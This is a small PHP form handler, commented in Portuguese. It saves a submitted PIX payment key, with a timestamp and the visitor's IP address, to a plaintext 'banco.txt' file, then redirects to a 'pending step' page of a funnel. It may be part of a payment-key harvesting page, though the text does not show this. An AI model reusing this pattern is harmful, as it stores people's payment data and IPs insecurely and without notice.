<?php
// Define o fuso horário para obter a hora e data corretas do Brasil
date_default_timezone_set('America/Sao_Paulo');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 1. Captura a chave PIX enviada pelo formulário
    // Usa htmlspecialchars para segurança, impedindo XSS.
    $pix = htmlspecialchars($_POST["pix"]);
    
    // 2. Define a data e hora atual
    $data_hora = date("Y-m-d H:i:s");
    
    // 3. Obtém o endereço IP do usuário
    $ip_usuario = $_SERVER['REMOTE_ADDR'];

    // 4. Monta o conteúdo a ser salvo
    // Apenas a chave PIX, data e IP são salvos, pois Email e Mensagem não estão no formulário
    $linha = "[$data_hora] IP: $ip_usuario | PIX: $pix" . PHP_EOL;

    // 5. Salva no arquivo "banco.txt" (simulando o "bloco de notas")
    // FILE_APPEND garante que o novo dado é adicionado ao final do arquivo
    file_put_contents("banco.txt", $linha, FILE_APPEND);

    // 6. Confirmação (Redireciona para a próxima etapa do funil após o salvamento)
    // Redireciona o usuário para a próxima página do processo (Etapa Pendente 0)
    header("Location: Etapa Pedente 0.html");
    exit(); 
    
} else {
    // Se não for um POST (alguém acessou diretamente o script)
    echo "Acesso inválido.";
}
?>